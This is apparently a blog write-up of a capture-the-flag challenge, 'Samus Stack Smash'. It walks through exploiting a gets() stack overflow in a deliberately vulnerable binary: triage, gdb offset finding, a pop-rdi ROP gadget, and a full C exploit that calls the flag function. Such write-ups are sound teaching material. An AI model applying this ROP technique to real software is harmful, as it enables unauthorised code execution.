---
layout: post
title: "Cyberscape 2026 (Samus Stack Smash)"
date: 2026-10-28
---

Cyberscape 2026, run by the National Cyber & Forensics Alliance, was my first real CTF. I'd spent plenty of time reading about exploit development but never actually built a working chain myself, so this felt like the right place to finally do that. Here's how I worked through the [Samus Stack Smash](/assets/files/samus_stack_smash) challenge.

<details markdown="1">
<summary>Table of Contents</summary>

- [Binary Triage](#binary-triage)
- [Locating the Vulnerability](#locating-the-vulnerability)
- [Finding the Offset](#finding-the-offset)
- [Building the ROP Chain](#building-the-rop-chain)
- [Verifying the Exploit](#verifying-the-exploit)

</details>

### Binary Triage

First thing I always do is run `file` to see what I'm dealing with. It shows a stripped, dynamically linked 64-bit ELF.

```
user@debian:~/Downloads$ file samus_stack_smash 
samus_stack_smash: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b189d06a7578a8d9b7eb85b64719e5ba3d2b8788, for GNU/Linux 3.2.0, stripped
```

Then I run `hardening-check` to lay out the protections: it's not a position independent executable, there's no stack protection, no fortify source functions, and no stack clash protection. Read-only relocations are the one box that's checked, but immediate binding is missing, and control flow integrity and branch protection are both absent too. Since the binary isn't position independent, every function address is fixed at compile time, so address space layout randomization barely matters here. That's good news for me, since I won't need a leak and can jump straight to a hardcoded address.

```
user@debian:~/Downloads$ hardening-check samus_stack_smash 
samus_stack_smash:
 Position Independent Executable: no, normal executable!
 Stack protected: no, not found!
 Fortify Source functions: no, only unprotected functions found!
 Read-only relocations: yes
 Immediate binding: no, not found!
 Stack clash protection: unknown, no -fstack-clash-protection instructions found
 Control flow integrity: no, not found!
 Branch Protection: no, not found!
```

### Locating the Vulnerability

Dropping into `main()` in the decompiler, I see it calls `sub_40128C()` almost right away. That function allocates a 32-byte stack buffer and reads into it with `gets()`, which does zero bounds checking. Any input longer than 32 bytes overflows into the saved frame pointer and the return address sitting behind it. That's the bug, and it's about as clean as it gets.

```c
int sub_40128C()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(s: "== Galactic Federation Checkpoint ==");
  puts(s: "Hunter, transmit suit authorization glyphs:");
  printf(format: "> ");
  gets(a1: v1);
  return printf(format: "Telemetry echo: %s\n", v1);
}
```

Poking around a bit more, I found `sub_40119B(__int64 a1)` at `0x000000000040119B`. It reads and prints `flag.txt`, but only if the argument passed in matches a hardcoded 64-bit value. So I wasn't just going to smash the stack and land on this function. I also needed the right value sitting in `RDI`, the first argument register under the System V calling convention, when I got there.

```c
void __fastcall __noreturn sub_40119B(__int64 a1)
{
  char s[136]; // [rsp+10h] [rbp-90h] BYREF
  FILE *stream; // [rsp+98h] [rbp-8h]

  if ( a1 != 0x43484F5A4F313031LL )
  {
    puts(s: "Authorization code rejected.");
    exit(status: 1);
  }
  stream = fopen(filename: "/flag.txt", modes: "r");
  if ( stream == nullptr )
  {
    puts(s: "Mission record cartridge missing.");
    exit(status: 1);
  }
  if ( fgets(s, n: 128, stream) == nullptr )
  {
    puts(s: "Mission record cartridge unreadable.");
    fclose(stream);
    exit(status: 1);
  }
  fclose(stream);
  printf(format: "Federation clearance restored: %s", s);
  exit(status: 0);
}
```

### Finding the Offset

I didn't want to guess the offset from the buffer size alone, since that's a good way to burn time chasing a bad payload. So I built a segmented pattern instead in Python, 32 bytes of `A`, then 8 bytes of `B`, then 8 bytes of `C`, so I could see exactly which bytes landed where once it crashed.

```
user@debian:~/Downloads$ python3
Python 3.13.5 (main, Aug 10 2026, 12:06:59) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> print("A" * 32 + "B" * 8 + "C" * 8)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
```

I fed that pattern to the binary under `gdb`. After the crash, `RBP` came back as `0x4242424242424242`, which confirmed the `B` bytes overwrote the saved frame pointer and that the overflow runs straight into the return address right after it. 32 bytes of buffer plus 8 bytes of saved `RBP` gave me a clean 40-byte offset to the return address.

```
user@debian:~/Downloads$ gdb ./samus_stack_smash 
GNU gdb (Debian 16.3-1) 16.3
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./samus_stack_smash...
(No debugging symbols found in ./samus_stack_smash)
(gdb) run
Starting program: /home/user/Downloads/samus_stack_smash 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
== Galactic Federation Checkpoint ==
Hunter, transmit suit authorization glyphs:
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC
Telemetry echo: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x00000000004012f4 in ?? ()
(gdb) info registers 
rax            0x41                65
rbx            0x7fffffffdcb8      140737488346296
rcx            0x0                 0
rdx            0x0                 0
rsi            0x7fffffffd9c0      140737488345536
rdi            0x7fffffffd990      140737488345488
rbp            0x4242424242424242  0x4242424242424242
rsp            0x7fffffffdb98      0x7fffffffdb98
r8             0x0                 0
r9             0x0                 0
r10            0x0                 0
r11            0x202               514
r12            0x0                 0
r13            0x7fffffffdcc8      140737488346312
r14            0x7ffff7ffd000      140737354125312
r15            0x403e00            4210176
rip            0x4012f4            0x4012f4
eflags         0x10202             [ IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7dac740      140737351698240
gs_base        0x0                 0 
```

### Building the ROP Chain

With the offset sorted, I needed a way to control `RDI` before the jump. I ran `ropper` looking for a `pop rdi; ret;` gadget and got a hit right away at `0x0000000000401196`. Exactly what I needed.

```
user@debian:~/Downloads$ ropper -f samus_stack_smash --search "pop rdi; ret;"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi; ret;

[INFO] File: samus_stack_smash
0x0000000000401196: pop rdi; ret; 
```

I put the payload together: 40 bytes of padding, then the `pop rdi; ret;` gadget, the expected authorization value, and the address of `sub_40119B()`. Here's the final exploit:

```c
#include <stdio.h>
#include <stdint.h>
#include <string.h>

int main(void) {
    unsigned char buffer[64] = {0};

    memset(buffer, 'A', 32);
    memset(buffer + 32, 'B', 8);

    uint64_t pop_rdi_ret   = 0x0000000000401196;
    uint64_t authorization = 0x43484F5A4F313031;
    uint64_t function      = 0x000000000040119B;

    memcpy(buffer + 40, &pop_rdi_ret, sizeof(pop_rdi_ret));
    memcpy(buffer + 48, &authorization, sizeof(authorization));
    memcpy(buffer + 56, &function, sizeof(function));

    fwrite(buffer, 1, sizeof(buffer), stdout);
    return 0;
}
```

### Verifying the Exploit

Before touching the real target, I planted a placeholder `flag.txt` at the filesystem root. That way if something went wrong, I'd know it was a bad offset or a bad gadget, not just a wrong guess at the authorization value.

```
user@debian:~/Downloads$ echo "ctf{string}" | sudo tee /flag.txt
[sudo] password for user: 
ctf{string}
```

Then I compiled the exploit and piped its output straight into the challenge binary's stdin. The payload landed cleanly on the first try. `RDI` picked up the right value, execution jumped exactly where I wanted, and the test flag printed to stdout. From there it was just a matter of running the same exploit against the live challenge binary to grab the real flag.

```
user@debian:~/Downloads$ gcc exploit.c -o exploit
user@debian:~/Downloads$ ./exploit | ./samus_stack_smash 
== Galactic Federation Checkpoint ==
Hunter, transmit suit authorization glyphs:
> Telemetry echo: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB�@
Federation clearance restored: ctf{string}
```

Happy hacking!
